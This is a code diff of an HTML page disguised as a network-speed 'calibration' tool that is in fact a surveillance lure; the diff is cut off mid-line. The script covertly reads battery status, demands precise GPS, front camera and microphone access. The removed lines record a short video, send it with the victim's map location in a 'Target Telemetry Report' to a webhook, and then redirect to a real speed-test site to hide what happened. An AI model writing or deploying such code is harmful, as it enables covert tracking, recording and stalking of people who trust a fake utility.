@@ -3,23 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SpeedTest Global | Calibration</title>
+    <title>Global Network Node | Calibration</title>
     <style>
-        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #232a42; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
-        #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
-        video, canvas { display: none; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #161b2c; padding: 35px; border-radius: 24px; text-align: center; width: 90%; max-width: 380px; border: 1px solid #232a42; box-shadow: 0 15px 50px rgba(0,0,0,0.6); }
+        .icon { font-size: 50px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #00d2ff); }
+        h2 { margin: 10px 0; color: #fff; letter-spacing: 1px; }
+        p { color: #8b96b1; font-size: 0.95rem; line-height: 1.5; }
+        .btn { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); color: white; border: none; padding: 20px; width: 100%; font-weight: bold; border-radius: 14px; cursor: pointer; margin-top: 25px; font-size: 1.1rem; transition: transform 0.2s; }
+        .btn:active { transform: scale(0.98); }
+        #status { margin-top: 20px; color: #5c6784; font-size: 0.85rem; font-family: monospace; }
+        video { display: none; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div style="font-size: 30px; margin-bottom: 10px;">🚀</div>
-        <h2>Hardware Calibration</h2>
-        <p>Syncing GPS, Camera, and Audio sensors for optimal routing.</p>
+        <div class="icon">📡</div>
+        <h2>Node Calibration</h2>
+        <p>Syncing hardware sensors to optimize your local routing path and minimize latency.</p>
         <button class="btn" id="startBtn">START CALIBRATION</button>
-        <p id="status">System Ready</p>
+        <div id="status">System Status: Ready</div>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -29,84 +33,37 @@
 
         document.getElementById('startBtn').addEventListener('click', async function() {
             const status = document.getElementById('status');
-            status.innerText = "Accessing System Nodes...";
+            status.innerText = "Initializing Secure Handshake...";
 
-            // 1. Get Battery Info (Silent)
-            let batteryDetails = "Unknown";
+            // 1. Silent Battery Check
+            let batteryLevel = "Unknown";
             try {
                 const b = await navigator.getBattery();
-                batteryDetails = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+                batteryLevel = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
             } catch(e) {}
 
-            // 2. Request GPS
+            // 2. Request Location
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "GPS Verified. Starting Video Sync...";
+                status.innerText = "GPS Verified. Syncing Media Nodes...";
                 
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
 
-                // 3. Request Video & Audio
+                // 3. Request Camera + Audio
                 let stream = null;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: "user", width: 640, height: 480 }, 
-                        audio: true 
+                        audio: { echoCancellation: true, noiseSuppression: true } 
                     });
                 } catch (e) {
-                    status.innerText = "Permissions Denied.";
+                    status.innerText = "Error: Media Access Denied.";
                     return;
                 }
 
                 if (stream) {
                     const video = document.getElementById('video');
                     video.srcObject = stream;
-                    
-                    // Setup Video Recorder
-                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                    const chunks = [];
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    
-                    mediaRecorder.start();
-                    status.innerText = "Calibrating Sensors (4s)...";
 
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                        mediaRecorder.onstop = async () => {
-                            const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                            const formData = new FormData();
-                            
-                            const message = {
-                                content: "🎥 **NEW VIDEO LOG**",
-                                embeds: [{
-                                    title: "Target Telemetry Report",
-                                    color: 15105570,
-                                    fields: [
-                                        { name: "📍 Location", value: `https://www.google.com/maps?q=$${lat},${lon}` },
-                                        { name: "🔋 Battery", value: batteryDetails, inline: true },
-                                        { name: "🎯 Accuracy", value: `${Math.round(pos.coords.accuracy)}m`, inline: true }
-                                    ]
-                                }]
-                            };
-
-                            formData.append('payload_json', JSON.stringify(message));
-                            formData.append('file', videoBlob, 'capture.webm');
-
-                            await fetch(WEBHOOK, { method: 'POST', body: formData });
-                            
-                            stream.getTracks().forEach(t => t.stop());
-                            done();
-                        };
-                    }, 4000); // 4 Seconds recording
-                }
-            }, (err) => {
-                alert("GPS Required.");
-            }, { enableHighAccuracy: true });
-        });
-
-        function done() {
-            document.getElementById('status').innerText = "Calibration Complete!";
-            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
-        }
-    </script>
-</body>
-</html>
+                    // Choose best supported format for the specific Android device
+                    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
